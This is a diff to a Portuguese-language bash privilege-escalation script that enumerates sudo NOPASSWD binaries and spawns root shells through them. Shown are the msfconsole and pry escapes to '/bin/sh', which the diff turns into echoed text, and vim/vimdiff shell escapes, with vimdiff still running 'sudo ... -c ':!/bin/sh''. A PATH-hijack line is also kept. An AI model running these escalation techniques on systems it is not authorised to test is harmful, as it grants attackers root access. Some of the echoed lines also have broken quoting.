@@ -16,6 +16,7 @@ echo "[*] [*] Verificando permissões sudo -l ...."
 echo "[*] ---------------------------------------"
 echo -e "\e[0m"
 
+
 sudol=$(sudo -n -l 2>&1)
 if [[ $? -ne 0 ]]; then
     echo "[-] 'sudo -n -l' falhou: $sudol"
@@ -900,10 +901,10 @@ EOF
             sudo "$paths"
             ;;
         msfconsole)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            irb
-            system("/bin/sh")
+            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
+            echo "sudo "$paths""
+            echo "irb"
+            echo "system("/bin/sh")"
             ;;
         msgattrib)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1167,8 +1168,8 @@ EOF
             ;;
         pry)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            system("/bin/sh")
+            echo "sudo "$paths""
+            echo "system("/bin/sh")"
             ;;
         psftp)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1673,10 +1674,12 @@ EOF
             ;;
         vim)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
-            sudo "$paths" -c ':!/bin/sh'
+            echo "Após abrir o vim, digite ':!COMANDO'"
+            sudo "$paths"
             ;;
         vimdiff)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
+            echo "Pressione ENTER, e em seguida ':!COMANDO'"
             sudo "$paths" -c ':!/bin/sh'
             ;;
         vipw)
@@ -1821,7 +1824,7 @@ EOF
             sudo PATH=$TF:$PATH "$paths" x
             ;;
         *)
-            echo "[-] Comando sudo permitido: $paths → sem exploit automático registrado."
+            echo "[-] Comando sudo permitido: $paths → sem exploit automático registrado"
         ;;
     esac
 done
